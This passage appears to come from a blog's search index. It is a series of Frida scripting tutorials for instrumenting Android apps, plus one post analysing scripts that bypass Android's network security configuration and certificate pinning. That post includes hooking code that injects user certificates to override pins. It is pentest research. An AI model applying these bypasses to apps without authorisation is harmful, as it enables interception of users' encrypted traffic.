BasicTypes.isCChar.implementation = function (char1) { return char1 == \u0026#39;c\u0026#39;; } } Using String type In this case the String is managed as a classic Java Object with some particularities regarding the javascript string type. Based on the previous logic used to send basic type parameters , we could call a method that receives two Strings in the following way:\nvar testStrings = function () { var BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(BasicTypes.concatString(\u0026#34;first\u0026#34;,\u0026#34;second\u0026#34;)); } When we run this, we get the following error:\nTypeError: undefined not callable (property \u0026#39;concatString\u0026#39; of [object Object]) at [anon] (../../../frida-gum/bindings/gumjs/duktape.c:65012) at /examples.js:112 at frida/node_modules/frida-java-bridge/lib/vm.js:11 at E (frida/node_modules/frida-java-bridge/index.js:346) at frida/node_modules/frida-java-bridge/index.js:298 at frida/node_modules/frida-java-bridge/lib/vm.js:11 This is an error because the parameter sent is a native javascript String, but it should be encapsulated in a java.lang.String object. So we need to create an instance of the String:\nvar String = Java.use(\u0026#34;java.lang.String\u0026#34;); var str1 = String.$new(\u0026#34;test \u0026#34;); var str2 = String.$new(\u0026#34;String\u0026#34;); console.log(BasicTypes.concatString(str1,str2)); The second step to test is the override of a method that receives one or more String. We created the following function that overrides the concatString method from the example APK:\nBasicTypes.concatString.implementation = function (str1,str2) { console.log(\u0026#34;First string: \u0026#34; + str1); console.log(\u0026#34;Second string: \u0026#34; + str2); return str1 + str2; } This code works perfectly because Frida wraps the String parameters and then returns a Javascript String to the internal implementation. So the concatenation works as in javascript, and Frida is in charge of converting the result to a java.lang.String object. Also the concatenation works with native attributes as it does in Java. As an example the following command works in java and in Javascript in the same way:\nstr1\u0026lt;\u0026ldquo;test \u0026ldquo;\u0026gt; + int1 \u0026lt;2\u0026gt; + str2 \u0026lt;\u0026ldquo;strings\u0026rdquo;\u0026gt; = \u0026ldquo;test 2 strings\u0026rdquo;\nString comparison The difference between a comparison between a native variable and a String is that the former is an object. So the variable that the developer manipulates holds a reference (pointer or memory value) to the real object. This is the reason a comparison == does not work with Strings, as it will naturally compare the references from the two Strings instead of the content. So to compare in Frida you should use the following script:\nvar strHex = String.$new(\u0026#34;hex\u0026#34;); console.log(\u0026#34;--\u0026gt; test\u0026#34;); return strHex.equals(str1); Accesing String attributes If the String is in an attribute of a class, and you want to get access from the Frida script, you need to access it through the attribute \u0026ldquo;value\u0026rdquo;, as in the following example:\nvar ScopedObject = Java.use(\u0026#34;com.blog.testfrida.complexobjects.ScopeObject\u0026#34;); console.log(\u0026#34;Direct access: \u0026#34; + ScopedObject.publicStaticObject.value); Encapsulation of attributes (optional) Initially I thought the access to an attribute will be transparent for the frida cli, so the first time I got to the situation of retrieving it, I tested the following FridaSnippet:\nvar ScopedObject = Java.use(\u0026#34;com.blog.testfrida.complexobjects.ScopeObject\u0026#34;); console.log(\u0026#34;Direct access: \u0026#34; + ScopedObject.publicStaticObject); which printed \u0026ldquo;Direct access: [object Object]\u0026rdquo;. This is due to the fact that the attributes in a Frida Object holds an encapsulation of a class. So when someone access it directly, it will return this content, and in this case it will cast it to the default Object string. To print the raw content of the variable (to check what it is), we can use the JSON.stringify javascript function:\nvar ScopedObject = Java.use(\u0026#34;com.blog.testfrida.complexobjects.ScopeObject\u0026#34;); console.log(\u0026#34;Direct access: \u0026#34; + JSON.stringify(ScopedObject.publicStaticObject)); which will return:\n{\u0026ldquo;fieldType\u0026rdquo;:1,\u0026ldquo;fieldReturnType\u0026rdquo;:{\u0026ldquo;className\u0026rdquo;:\u0026ldquo;java.lang.String\u0026rdquo;,\u0026ldquo;name\u0026rdquo;:\u0026ldquo;Ljava/lang/String;\u0026rdquo;,\u0026ldquo;type\u0026rdquo;:\u0026ldquo;pointer\u0026rdquo;,\u0026ldquo;size\u0026rdquo;:1},\u0026quot;$holder\u0026rdquo;:{}}\nwhich shows that the field is of type java.lang.String. In order to return the actual value, we should call the attribute value from the Frida Object.\nNext: Methods\n","permalink":"https://cmrodriguez.me/blog/primitive-types/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (1) - Primitive Types"},{"categories":["Frida","Android"],"contents":"In this post I will explain how to call methods from java through Frida. A method is a function that belongs to a class. In Java all the functions are attached to classes. We have two different kind of methods. The static ones, that can be called from a Class, and the non-static that can only be used from an instance of an object. If you need any more information about this, check the following link: Static and Non Static Methods.\nThe following code snippet shows how to call a static method:\nvar BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); BasicTypes.divideFloat(23,3); To call a non-static method, we need to get first an object, so we need first to get the class reference in Frida:\nvar Person = Java.use(\u0026#34;com.blog.testfrida.complexobjects.Person\u0026#34;); Then we create an object from that class. This special method is called constructor):\nvar personInstance = Person.$new(); personInstance.setId(1); The following code shows how to send parameters to a method:\nvar String = Java.use(\u0026#34;java.lang.String\u0026#34;); personInstance.setName(String.$new(\u0026#34;Peter Griffin\u0026#34;)); Note that the parameters sent have to be javascript encapsulated objects\nOverridden methods In Java there is a possibility to generate overridden methods. Basically it means that two or more methods have the same name and different parameters (in quantity and type). As an example the following java code snippet is valid:\npublic static int multiply(int val1, int val2) { return val1 * val2; } ​ public static byte multiply(byte val1, byte val2) { return (byte) (val1 * val2); } If you want to use an overridden method, the syntax does not change, as Frida solves the method by the argument types, so in the previous example the snippet code to call the multiply operation would be the following one:\nvar BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(BasicTypes.multiply(3,5)); The difference in the syntax comes when you want to modify a method with overridden options. The naive approach would be the following one:\nvar BasicTypes = Java.use(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;); console.log(BasicTypes.multiply(3,5)); ​ BasicTypes.multiply.implementation = function (val1, val2) { console.log(\u0026#34;it works\u0026#34;); return val1 * val2; } If that code is executed, you\u0026rsquo;ll see in the Frida cli console the following error:\nError: multiply(): has more than one overload, use .overload() to choose from: .overload(\u0026#39;long\u0026#39;, \u0026#39;long\u0026#39;) .overload(\u0026#39;byte\u0026#39;, \u0026#39;byte\u0026#39;) .overload(\u0026#39;short\u0026#39;, \u0026#39;short\u0026#39;) .overload(\u0026#39;int\u0026#39;, \u0026#39;int\u0026#39;) .overload(\u0026#39;float\u0026#39;, \u0026#39;float\u0026#39;) at throwOverloadError (frida/node_modules/frida-java-bridge/lib/class-factory.js:1054) at frida/node_modules/frida-java-bridge/lib/class-factory.js:714 at /examples.js:164 which states that you should define which of the overridden methods you want to modify. As an example we\u0026rsquo;ll modify the multiplication of two ints:\nBasicTypes.multiply.overload(\u0026#39;int\u0026#39;,\u0026#39;int\u0026#39;).implementation = function (val1, val2) { return val1 * val2; } Once you start to write Frida scripts, you will eventually find the need to modify or rewrite an overridden method. Not all the types of attributes are written as clear as the basic types. The following table can help to search for the types:\nJava Type Frida Type int int byte byte short short long long float float double double char char {Object} (eg. String) {package}.{Object} (eg. java.lang.String) int[] [I byte[] [B short[] [S long[] [J float[] [F double[] [D char[] [C {Object}[] [L{package}.{Object} (eg. [Ljava.lang.String) Note that the object array starts with a \u0026ldquo;L\u0026rdquo; char.\nIf you wander where those weird data types comes from, they are inherited by the dex specification (Java code is transformed in dex format when the application is compiled). Primitives are represented by a single letter. They are actually stored in the dex file, in string form. They are specified in the Dex format document in the AOSP repository.\nAs an example the following script lists all the overridden methods with their signatures:\nfunction listOverritenMethods(className, func) { var Class = Java.use(className); var overloadedMethods = Class[func].overloads; for (i in overloadedMethods) { if (overloadedMethods[i].hasOwnProperty(\u0026#39;argumentTypes\u0026#39;)) { var parameterString = \u0026#34;(\u0026#34;; for (j in overloadedMethods[i].argumentTypes) { parameterString = parameterString + overloadedMethods[i].argumentTypes[j].className + \u0026#34;,\u0026#34;; } parameterString = parameterString.slice(0,-1) + \u0026#34;)\u0026#34;; console.log(func + parameterString); } } } ​ Java.perform(function () { listOverritenMethods(\u0026#34;com.blog.testfrida.examples.BasicTypes\u0026#34;,\u0026#34;multiply\u0026#34;) }); Next: Access to content of classes\n","permalink":"https://cmrodriguez.me/blog/methods/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (2) - Methods"},{"categories":["Frida","Android"],"contents":"TL;DR In this blogpost I show the results of an analysis done over some frida scripts that allows the bypass of the network security configuration in Android. I show a new way to bypass the configuration. Also I will show the procedure used to test the scripts in multiple scenarios, and an analysis of the reason some scripts do not work in all the test-cases.\nA couple of months ago I was in the middle of an Android application security assessment. One of the first steps while preparing the environment to start the pentest is configuring the application to bypass the network security config (check this link for references regarding network security config: https://developer.android.com/training/articles/security-config). As I am a frida fan, I tend to do everything with it (there are other alternatives to do this: https://www.nccgroup.trust/uk/about-us/newsroom-and-events/blogs/2017/november/bypassing-androids-network-security-configuration/).\nI downloaded two or three scripts at that moment, but when I run it in my Android 7.1.0, none of those worked. That was the reason I started to analyze how the network security config worked, and how to bypass it with frida. The first thing I did was to generate different test cases. I tried to choose the most popular ones:\nOKHttp (it is also used in retrofit and volley also) HttpsURLConnection WebView (Chromium in API 25 and 26, and Default WebView in API 24). Then I generated three applications with different network security config:\nAn application that used the default NSC configuration (without network-security-config xml file) - called BypassNSC An application with a NSC file that used only system certificates - called BypassNSC2. An application with a NSC file that enforced the certificate pinning - called BypassNSC3. At the time of evaluating the scripts with my test suite, only one worked in the 100% of the cases. I also developed an alternative that also works in all of the cases.\nThe code that parses and validates the network security config is in the Android SDK, so it might change between versions. I tested the scripts with the versions 24,25 and 26.\nThe following github repository has all the applications I developed and the scripts I used.\nhttps://github.com/CesarMRodriguez/network-security-config-frida\nThe scripts are called:\nnetwork-security-config-bypass-1.js network-security-config-bypass-2.js network-security-config-bypass-3.js network-security-config-bypass-cr.js \u0026lt;\u0026ndash; this is the one I created The following is a screenshot of the table I created with the results of the analysis:\nI analysed all the scripts I downloaded to know why it didn\u0026rsquo;t work in some of the scenarios.\nnetwork-security-config-bypass-1.js Original reference: Link\nIn this case the script basically modifies the getEffectiveCertificatesEntryRefs method from the NetworkSecurityConfig.Builder class. This method returns the list of valid certificates. In a standard Android configuration, the list of certificates it returns is the ones installed in the system. In this script, the certificates installed by the user are also returned. So it is logical that the bypass for the first two applications worked, but I was surprised that the ones with the certificate pinning configuration also worked. The method that validates the pinning is the following one:\nandroid.security.net.config.NetworkSecurityTrustManager.checkPins The following stacktrace shows the path executed till it gets to the checkPins function:\nat android.security.net.config.NetworkSecurityTrustManager.checkPins(Native Method) at android.security.net.config.NetworkSecurityTrustManager.checkServerTrusted(NetworkSecurityTrustManager.java:95) at android.security.net.config.RootTrustManager.checkServerTrusted(RootTrustManager.java:88) at com.android.org.conscrypt.Platform.checkServerTrusted(Platform.java:178) at com.android.org.conscrypt.OpenSSLSocketImpl.verifyCertificateChain(OpenSSLSocketImpl.java:596) at com.android.org.conscrypt.NativeCrypto.SSL_do_handshake(Native Method) at com.android.org.conscrypt.OpenSSLSocketImpl.startHandshake(OpenSSLSocketImpl.java:357) ... If the patch is not executed, the following exception is thrown when it gets to that method:\nCaused by: java.security.cert.CertificateException: Pin verification failed at android.security.net.config.NetworkSecurityTrustManager.checkPins(NetworkSecurityTrustManager.java:148) at android.security.net.config.NetworkSecurityTrustManager.checkServerTrusted(NetworkSecurityTrustManager.java:95) at android.security.net.config.RootTrustManager.checkServerTrusted(RootTrustManager.java:88) at com.android.org.conscrypt.Platform.checkServerTrusted(Platform.java:178) at com.android.org.conscrypt.OpenSSLSocketImpl.verifyCertificateChain(OpenSSLSocketImpl.java:596) at com.android.org.conscrypt.NativeCrypto.SSL_do_handshake(Native Method) at com.android.org. Let\u0026rsquo;s check the implementation of this method (API 25):\nprivate void checkPins(List\u0026lt;X509Certificate\u0026gt; chain) throws CertificateException { PinSet pinSet = mNetworkSecurityConfig.getPins(); if (pinSet.pins.isEmpty() || System.currentTimeMillis() \u0026gt; pinSet.expirationTime || !isPinningEnforced(chain)) { return; } Set\u0026lt;String\u0026gt; pinAlgorithms = pinSet.getPinAlgorithms(); Map\u0026lt;String, MessageDigest\u0026gt; digestMap = new ArrayMap\u0026lt;String, MessageDigest\u0026gt;( pinAlgorithms.size()); for (int i = chain.size() - 1; i \u0026gt;= 0 ; i--) { X509Certificate cert = chain.get(i); byte[] encodedSPKI = cert.getPublicKey().getEncoded(); for (String algorithm : pinAlgorithms) { MessageDigest md = digestMap.get(algorithm); if (md == null) { try { md = MessageDigest.getInstance(algorithm); } catch (GeneralSecurityException e) { throw new RuntimeException(e); } digestMap.put(algorithm, md); } if (pinSet.pins.contains(new Pin(algorithm, md.digest(encodedSPKI)))) { return; } } } // TODO: Throw a subclass of CertificateException which indicates a pinning failure. throw new CertificateException(\u0026#34;Pin verification failed\u0026#34;); } This method receives a list of certificates returned by the site when the communication starts. The first thing it does is checking some conditions:\nthe pinset (list of pins loaded during the configuration instantiation) is empty. the pinset has expired at the moment of validation pinning is NOT enforced by configuration If any of those conditions are true, pinning validation is ignored. In case the validation must be achieved, the application checks if any of the certificates provided by the site matches with one of the pins defined in the network security config file. In that case the validation is successful. If that does not happen, the method throws the exception shown in the previous stacktrace.\nInitially I thought the issue was in the for loop that analyzed each of the certificates, so I added the following log in the frida script:\nvar Pin = Java.use(\u0026#34;android.security.net.config.Pin\u0026#34;); Pin.$init.implementation = function (digestAlg, digest) { var bt = Java.use(\u0026#34;android.util.Log\u0026#34;).getStackTraceString(Java.use(\u0026#34;java.lang.Exception\u0026#34;).$new()); console.log(\u0026#34;\\nBacktrace:\\n\u0026#34; + bt); console.log(digestAlg); return this.$init(digestAlg,digest); } It should print each of the Pins created during the evaluation. When I run the application with the changes I found that the application wasn\u0026rsquo;t getting to that point.\nI thought it could be because of the for loop, so I added a log in the call to pinSet.getPinAlgorithms(), that was executed before the for loop:\nvar PinSet = Java.use(\u0026#34;android.security.net.config.PinSet\u0026#34;); PinSet.getPinAlgorithms.implementation = function () { var bt = Java.use(\u0026#34;android.util.Log\u0026#34;).getStackTraceString(Java.use(\u0026#34;java.lang.Exception\u0026#34;).$new()); console.log(\u0026#34;\\nBacktrace:\\n\u0026#34; + bt); return this.getPinAlgorithms(); } And nothing was printed. My next idea was that the first if was evaluated to true, and that was the reason it didn\u0026rsquo;t get to the rest of the method. To check which conditions were the ones that made the method exit, I added the following lines to the script:\nNetworkSecurityTrustManager.checkPins.implementation = function (pins) { var bt = Java.use(\u0026#34;android.util.Log\u0026#34;).getStackTraceString(Java.use(\u0026#34;java.lang.Exception\u0026#34;).$new()); console.log(\u0026#34;\\nBacktrace:\\n\u0026#34; + bt); pinSet = this.mNetworkSecurityConfig.value.getPins(); console.log(\u0026#34;pinSet.pins.value.isEmpty: \u0026#34; +pinSet.pins.value.isEmpty()); console.log(\u0026#34;isPinningEnforced: \u0026#34; +this.isPinningEnforced(pins)); console.log(\u0026#34;pins.isEmpty: \u0026#34; +pins.isEmpty()); console.log(System.currentTimeMillis()) console.log(pinSet.expirationTime.value); console.log(System.currentTimeMillis() \u0026gt; pinSet.expirationTime.value); this.checkPins(pins); } So after running the application I got the following output:\npinSet.pins.value.isEmpty: false isPinningEnforced: false \u0026lt;-- this condition is the problematic one pins.isEmpty: false 1562031248274 9223372036854775807 false As it can be seen, the isPinningEnforced was evaluated to false and then as it was negated, it transformed all the expression to true.\nThe method has the following implementation:\nprivate boolean isPinningEnforced(List\u0026lt;X509Certificate\u0026gt; chain) throws CertificateException { if (chain.isEmpty()) { return false; } X509Certificate anchorCert = chain.get(chain.size() - 1); TrustAnchor chainAnchor = mNetworkSecurityConfig.findTrustAnchorBySubjectAndPublicKey(anchorCert); if (chainAnchor == null) { throw new CertificateException(\u0026#34;Trusted chain does not end in a TrustAnchor\u0026#34;); } return !chainAnchor.overridesPins; } I knew the chain wasn\u0026rsquo;t empty, as I already executed the evaluation of the List, so the problem should ne in the findTrustAnchorBySubjectAndPublicKey, which returned a chainAnchor with the attribute overridesPins in true.\nThe findTrustAnchorBySubjectAndPublicKey method is implemented in the NetworkSecurityConfig class:\npublic TrustAnchor findTrustAnchorBySubjectAndPublicKey(X509Certificate cert) { for (CertificatesEntryRef ref : mCertificatesEntryRefs) { TrustAnchor anchor = ref.findBySubjectAndPublicKey(cert); if (anchor != null) { return anchor; } } return null; } It iterates over all the CertificatesEntryRef created during the seting up, and returns the first one that matches the SubjectAndPublicKey. In this scenario it will always return the ones from the proxy. After reading the source code I went to the CertificatesEntryRef class to check where the classes were instantiated, and found that the only constructor was the following one:\npublic CertificatesEntryRef(CertificateSource source, boolean overridesPins) { mSource = source; mOverridesPins = overridesPins; } If you read the frida script again, you will see that the CertificatesEntryRef were created in the following way:\nNetworkSecurityConfig_Builder.getEffectiveCertificatesEntryRefs.implementation = function(){ origin = this.getEffectiveCertificatesEntryRefs() source = UserCertificateSource.getInstance() userCert = CertificatesEntryRef.$new(source,true) \u0026lt;-- sets overridesPins in true origin.add(userCert) return origin } And that is the reason why this script works for all the scenarios.\nnetwork-security-config-bypass-2.js Original Reference: Link\nIn this case, the only case that worked was the one where the network security config file was not present. I analyzed why this patch didn\u0026rsquo;t work. The issue is in the XmlConfigSource in the method \u0026ldquo;parseNetworkSecurityConfig\u0026rdquo;:\nXmlUtils.beginDocument(parser, \u0026#34;network-security-config\u0026#34;); int outerDepth = parser.getDepth(); while (XmlUtils.nextElementWithin(parser, outerDepth)) { //here it creates a NetworkSecurityconfig.Builder based on the xml structure. ... } ... NetworkSecurityConfig.Builder platformDefaultBuilder = NetworkSecurityConfig.getDefaultBuilder(mTargetSdkVersion); \u0026lt;-- this is the method changed with the script addDebugAnchorsIfNeeded(debugConfigBuilder, platformDefaultBuilder); //baseConfigBuilder is null only if the xml network-security-config is not defined in the AndroidManifest.xml if (baseConfigBuilder != null) { baseConfigBuilder.setParent(platformDefaultBuilder); addDebugAnchorsIfNeeded(debugConfigBuilder, baseConfigBuilder); } else { baseConfigBuilder = platformDefaultBuilder; } ... mDefaultConfig = baseConfigBuilder.build(); mDomainMap = configs; } The build method generates the NetworkSecurityConfig entity:\npublic NetworkSecurityConfig build() { boolean cleartextPermitted = getEffectiveCleartextTrafficPermitted(); boolean hstsEnforced = getEffectiveHstsEnforced(); PinSet pinSet = getEffectivePinSet(); List\u0026lt;CertificatesEntryRef\u0026gt; entryRefs = getEffectiveCertificatesEntryRefs(); return new NetworkSecurityConfig(cleartextPermitted, hstsEnforced, pinSet, entryRefs); } The valid certificate sources are defined in the entryRefs variable, which is constructed as:\nprivate List\u0026lt;CertificatesEntryRef\u0026gt; getEffectiveCertificatesEntryRefs() { if (mCertificatesEntryRefs != null) { return mCertificatesEntryRefs; } if (mParentBuilder != null) { return mParentBuilder.getEffectiveCertificatesEntryRefs(); } return Collections.\u0026lt;CertificatesEntryRef\u0026gt;emptyList(); } In this case mCertificatesEntryRefs is not null, as it returns the standard SystemCertificateSource (looks for all the certs in the system ca folder). So the mParentBuilder (the one modified in the script) is never called.\nLater on, when the server certificate is validated, the application calls the method NetworkSecurityConfig.findTrustAnchorBySubjectAndPublicKey, which filters the valid certificates from the system folder:\npublic TrustAnchor findTrustAnchorBySubjectAndPublicKey(X509Certificate cert) { for (CertificatesEntryRef ref : mCertificatesEntryRefs) { TrustAnchor anchor = ref.findBySubjectAndPublicKey(cert); if (anchor != null) { return anchor; } } return null; } leading to the exception thrown in the stacktrace, because there aren\u0026rsquo;t coincidences as the certificate return by the server is self-signed:\ncom.android.org.conscrypt.TrustManagerImpl.checkTrusted(TrustManagerImpl.java:375) at com.android.org.conscrypt.TrustManagerImpl.getTrustedChainForServer(TrustManagerImpl.java:304) at android.security.net.config.NetworkSecurityTrustManager.checkServerTrusted(NetworkSecurityTrustManager.java:94) at android.security.net.config.RootTrustManager.checkServerTrusted(RootTrustManager.java:88) ... network-security-config-bypass-3.js Original Reference: Link\nThis works in two of the three scenarios, because the patch is executed in the method that validates certificates. But it does not work in the third scenario because the pin validation is executed in other method, as shown in the error stacktrace:\nat android.security.net.config.NetworkSecurityTrustManager.checkPins(NetworkSecurityTrustManager.java:148) at android.security.net.config.NetworkSecurityTrustManager.checkServerTrusted(NetworkSecurityTrustManager.java:95) at android.security.net.config.RootTrustManager.checkServerTrusted(RootTrustManager.java:88) at com.android.org.conscrypt.Platform.checkServerTrusted(Platform.java:203) at com.android.org.conscrypt.OpenSSLSocketImpl.verifyCertificateChain(OpenSSLSocketImpl.java:592) at com.android.org.conscrypt.NativeCrypto.SSL_do_handshake(Native Method) at com.android.org.conscrypt.OpenSSLSocketImpl.startHandshake(OpenSSLSocketImpl.java:351) ... 25 more network-security-config-bypass-cr.js In this case the method patched is getConfigSource, which is called when the network-security-config is parsed. As it can be seen, the reimplementation proposed creates a DefaultConfigSource, setting as a parameter the android version 23. So regardless of the file uploaded in the application, it will always retrieve the configuration of Android 23 (adds user certificates, does not validate certificate pinning, and allows http communication at http level).\nConclusion: I could achieve my goal, that was finding a script to bypass the network security configuration implemented by the Android SDK. Creating a new alternative to the one I found was a bonus track. During the process I learnt many aspects of the SDK, frida and the Android ecosystem. It is not easy to find bypasses. The hardest part during my analysis was the definition and setting up of all the environment to execution different test scenarios. Adding a new script, a new way to execute requests or another SDK would lead to at least 18 new cases. I guess this is the main reason many of the scripts I found worked for some cases (but not for all of them).\n","permalink":"https://cmrodriguez.me/blog/nsc-bypass/","tags":["Frida","Android"],"title":"Analysis of Network Security Configuration bypasses with Frida"},{"categories":["Frida","Android"],"contents":"In this post I will explain how to try exception handling in Java with Frida. While working on Frida scripts it is usually common to get an error that will crash the script or even the application. So to reliably create applications powered by Frida it is advisable to protect the code from unexpected errors by using exceptions, as shown in the following example:\ntry { var instanceInnerClass = InnerClass.$new(); } catch (e) { var instanceOuterClass = OuterClass.$new(); var instanceInnerClass = InnerClass.$new(instanceOuterClass); } finally { //always gets to this part. } So if any error happens when you call the InnerClass.$new(), the script won\u0026rsquo;t crash, and the execution will follow.\nJava exception handling from Frida When an exception is thrown, Frida generates a javascript exception as well The variable thrown is a JSON with a $handle structure, so we have to cast it to an appropriate class. Depending on the situation we might or might not know which exception can be thrown based on the source code. So in order to handle all the possible exceptions thrown by Java, we need to cast it to a \u0026ldquo;java.lang.Throwable\u0026rdquo; class, and then cast it to the specific class (only if you want to do something specific related to the exception class):\nvar testExceptions = function () { var ThrowingExceptionClass = Java.use(\u0026#34;com.blog.testfrida.exceptions.ThrowingExceptionClass\u0026#34;); try { ThrowingExceptionClass.callException(); } catch (ex) { //ex is a handle, you have to cast it. var Exception = Java.use(\u0026#34;java.lang.Trowable\u0026#34;); var item = Java.cast(ex,Exception); var SpecificException = Java.use(item.$className); item = Java.cast(ex,SpecificException); console.log(item.attribute.value); } } ","permalink":"https://cmrodriguez.me/blog/exception-handling/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (10) - Exception Handling"},{"categories":["Frida","Android"],"contents":"In this blogpost I will explain how to access different methods with different visibilities in a class through Frida. Whenever we work with Java we have four scopes available applicable to a class, method or attribute. The following table shows what each scope means.\nClass Package Subclass (same pkg) Subclass (diff pkg) World public + + + + + protected + + + + no modifier + + + private + : accessible blank : not accessible As an example a private method can only be invoked by the class or instance that owns the method (if it is not static, just by an instance). The static methods and objects can be used from a Frida script independently of the scope modifier, as shown in the following example:\nvar ScopeObject = Java.use(\u0026#34;com.blog.testfrida.complexobjects.ScopeObject\u0026#34;); console.log(\u0026#34;private static object:\u0026#34; + ScopeObject.privateStaticObject.value); console.log(\u0026#34;protected static object:\u0026#34; + ScopeObject.protectedStaticObject.value); console.log(\u0026#34;public static object:\u0026#34; + ScopeObject.publicStaticObject.value); console.log(\u0026#34;static object:\u0026#34; + ScopeObject.nonModifiedStaticObject.value); console.log(\u0026#34;private static method:\u0026#34; + ScopeObject.privateStaticMethod()); console.log(\u0026#34;protected static method:\u0026#34; + ScopeObject.protectedStaticMethod()); console.log(\u0026#34;public static method:\u0026#34; + ScopeObject.publicStaticMethod()); console.log(\u0026#34;static method:\u0026#34; + ScopeObject.nonModifiedStaticMethod()); In order to use the attributes and methods of an instance, we need to create an instance by calling its constructor. Frida acts like in the case of the static methods and attributes:\nvar ScopeObject = Java.use(\u0026#34;com.blog.testfrida.complexobjects.ScopeObject\u0026#34;); var scopeInstance = ScopeObject.$new(); console.log(\u0026#34;private object:\u0026#34; + scopeInstance.privateObject.value); console.log(\u0026#34;protected object:\u0026#34; + scopeInstance.protectedObject.value); console.log(\u0026#34;public object:\u0026#34; + scopeInstance.publicObject.value); console.log(\u0026#34;object:\u0026#34; + scopeInstance.nonModifiedObject.value); console.log(\u0026#34;private method:\u0026#34; + scopeInstance.privateMethod()); console.log(\u0026#34;protected method:\u0026#34; + scopeInstance.protectedMethod()); console.log(\u0026#34;public method:\u0026#34; + scopeInstance.publicMethod()); console.log(\u0026#34;method:\u0026#34; + scopeInstance.nonModifiedMethod()); Next: \u0026ldquo;this\u0026rdquo; reference\n","permalink":"https://cmrodriguez.me/blog/classes-content/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (3) - Access to content of classes"},{"categories":["Frida","Android"],"contents":"In this post I\u0026rsquo;ll show how to access the this reference. In Java (and a lot of other languages as well) there is always a special variable called this that references the object which is running the method. In Frida, whenever someone is rewriting a method, he has access to the \u0026ldquo;this\u0026rdquo; parameter. Check the following script as an example:\nBasicTypes.addTwoInts.implementation = function (var1,var2) { console.log(\u0026#34;the method is being called\u0026#34;); return this.addTwoInts(var1,var2); } In this case the \u0026ldquo;this\u0026rdquo; references the class BasicTypes. So by calling the \u0026ldquo;this.addTwoInts\u0026rdquo; we are calling the original implementation of the method, instead of reimplementing it. This feature is useful for many use cases as:\nknow if a method is being called (as shown in the example above) print the input values to know what is being received by the function. print the stack trace to know where it is being called. In all these cases the idea is not to change the workflow of the methods, just trace or debug the functionality.\nNext: Arrays\n","permalink":"https://cmrodriguez.me/blog/this-reference/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (4) - 'this' Reference"},{"categories":["Frida","Android"],"contents":"In this post I\u0026rsquo;ll explain how to use arrays from Java in Frida. Arrays are transformed in Frida from Javascript to Java transparently, so there is no special consideration, as shown in the following examples:\nvar intArray = [1, 2, 3]; console.log(ArrayType.sumArray(intArray)); This example shows a transformation from a javascript Array to a Java array.\nArrayType.sumArray.overload(\u0026#34;[I\u0026#34;).implementation = function (arrayList) { var total = 0; for (var i = 0; i \u0026lt; arrayList.length; i++) { total += arrayList[i]; } console.log(\u0026#34;Entra en arrayInt sumArray: \u0026#34; + total); return total; } This method receives an array in Java. When the Frida user writes the reimplementation function, they will receive a Javascript Array.\nWarning The forEach structure (used in Javascript) to iterate on an array does not work.\nWhenever the following code is called:\nvar total = 0.0; arrayList.forEach(function (element) { total += element; }); the frida server generates an error:\nTypeError: undefined not callable (property \u0026#39;forEach\u0026#39; of [object Object]) at [anon] (../../../frida-gum/bindings/gumjs/duktape.c:65012) at /examples.js:278 at input:1 Working with array of Objects is like working with native types, with the exception that a position in the Array can be null, so it must be taken in consideration when the script is being developed, as in the following example:\nvar peopleArray = ArrayType.getAllPeople(); for (var i = 0; i \u0026lt; peopleArray.length; i++) { if (peopleArray[i] == null) { console.log(i + \u0026#34; - null\u0026#34;); } else { console.log(peopleArray[i].getId()+\u0026#34; - \u0026#34;+peopleArray[i].getName() + \u0026#34; - \u0026#34; + peopleArray[i].getAge()); } } Note A null value in the Java array is translated to a null javascript value automatically by the framework.\nNext: Enums\n","permalink":"https://cmrodriguez.me/blog/arrays/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (5) - Arrays"},{"categories":["Frida","Android"],"contents":"It is a bit complicated to work on Enums. There is a difference between Enums and common classes. The latter has multiple values but no status. So it is usually used to hold finite and semantically strong status, like in the following case months of a year (in Java code):\nenum Month { JAN, FEB, MAR, APR, MAY, JUN, JUL, AUG, SEP, OCT, NOV, DEC } To set a value you have to define the value to set:\nMonth month = Month.APR; In Frida we have the following possibilties:\nGenerate a Frida reference to the enum Month = Java.use(\u0026#34;com.blog.testfrida.complexobjects.DateAbstraction$Month\u0026#34;); Get all the possible values (it returns an array, so it can be iterated as shown in the array part of this guide): Month.values(); Print the value of a particular state. Note that we need a .value to get to the real value and not the wrapper of the status: //Month has not redefined the toString so it calls the Object one console.log(Month.APR.value); The toString method does not work in this case, as it will print the generic \u0026quot;[object Object]\u0026quot; string.\nInstantiate a Month value based on a String, and send it as a parameter (there are two ways to send it as a parameter to the Java method):\nconsole.log(DateAbstraction.getMonthName(Month.valueOf(String.$new(\u0026#34;APR\u0026#34;)))); console.log(DateAbstraction.getMonthName(Month.APR.value)); While writing this guide I had issues finding a way to get the value from a method (when it returns an Enum) and get the value when You want to override a method. The following example does not work as expected. We have the following code in Java:\npublic static Month getMay() { return Month.MAY; } When we get the result from Frida:\nMay = DateAbstraction.getMay(); the object returned seems to be the Month enum itself and not the particular value (so as an example the .value does not work with the May object). I\u0026rsquo;ll post a bug in the Frida repo and will update the result.\nNext: Inheritance\n","permalink":"https://cmrodriguez.me/blog/enums/","tags":["Frida","Android","Scripting guide"],"title":"Frida Scripting Guide (6) - Enums"},{"categories":["Frida","Android"],"contents":"In this post I will show how to use inheritance in Java from Frida. Java as a OOP language has the inheritance feature. When one class inherits from another class in Java, the two classes take on certain roles. The class that extends (inherits from another class) is the subclass and the class that is being extended (the class being inherited from) is the superclass. In other words, the subclass extends the superclass. Or, the subclass inherits from the superclass. The subclass inherits the attributes and methods from their parents, so a subclass behaves like a superclass.\npublic static double getPerimeter(Figure figure) { return figure.perimeter(); } As it can be seen it receives a \u0026ldquo;Figure\u0026rdquo; class type. As the Circle and Square classes are figures (because of inheritance), you can send any instance of these two classes to the getPerimeter method. Let\u0026rsquo;s do this with Frida:\nvar TestInheritance = Java.use(\u0026#34;com.blog.testfrida.inheritance.TestInheritance\u0026#34;); 